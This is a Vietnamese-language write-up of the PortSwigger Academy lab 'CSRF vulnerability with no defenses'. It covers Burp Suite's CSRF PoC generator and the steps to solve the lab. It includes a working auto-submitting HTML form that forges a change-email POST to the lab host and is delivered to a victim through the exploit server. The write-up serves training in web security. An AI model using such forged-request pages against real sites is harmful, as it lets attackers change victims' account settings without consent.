# How to construct a CSRF attack

Việc tạo HTML theo cách thủ công để khai thác CSRF có thể cồng kềnh, đặc biệt là khi request mong muốn chứa một số lượng lớn params hoặc có những điều kỳ quặc khác trong request. Cách dễ nhất để xây dựng khai thác CSRF là sử dụng CSRF PoC generator, được tích hợp trong Burp Suite Professional:

- Chọn bất cứ requests nào trong Burp Suite Professional mà muốn kiểm tra hoặc khai thác.
- Từ context-menu nhấp chuột phải, chọn Engagement tools / Generate CSRF PoC.
- Burp Suite sẽ tạo ra một số HTML mà sẽ kích hoạt request đã chọn (trừ cookie, sẽ tự động thêm bởi trình duyệt của nạn nhân).
- Có thể điều chỉnh các tùy chọn khác nhau trong CSRF PoC generator để tinh chỉnh các khía cạnh của cuộc tấn công. Có thể cần phải làm điều này trong một số tình huống bất thường để đối phó với các tính năng kỳ quặc của requests.
- Sao chép HTML được tạo vào website, xem nó trong trình duyệt được đăng nhập vào website dễ bị tổn thương và kiểm tra xem request dự định có được ban hành thành công hay không và hành động mong muốn xảy ra.

# Lab: CSRF vulnerability with no defenses

![img](https://imgur.com/KUofHKL.png)

### Web page:

![img](https://imgur.com/TvuMeyI.png)

Log in với account được cung cấp: wiener:peter

![img](https://imgur.com/AqtI3jt.png)

Click Update Email và Intercept request này Burp Suite:

![img](https://imgur.com/rIpnCRZ.png)

Truy cập Exploit Server: 

![img](https://imgur.com/hS3wY3V.png)

![img](https://imgur.com/ZE0a7PB.png)

Truy cập *https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/Cross-site%20Request%20Forgery%20(CSRF)/README.md* để lấy CSRF HTML payload:

    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
      <script>history.pushState('', '', '/')</script>
        <form action="https://0a290081042f97a0838e74f5003c005b.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="Test@Test.com" />
          <input type="submit" value="Submit request" />
        </form>
        <script>document.forms[0].submit();</script>
      </body>
    </html>

Chỉnh sửa URL và copy vào phần body, sau đó click Store: 

![img](https://imgur.com/ntSeppk.png)

View exploit để xác nhận và cuối cùng Deliver exploit to the victim.

Solved the lab!

![img](https://imgur.com/UAldlL8.png)
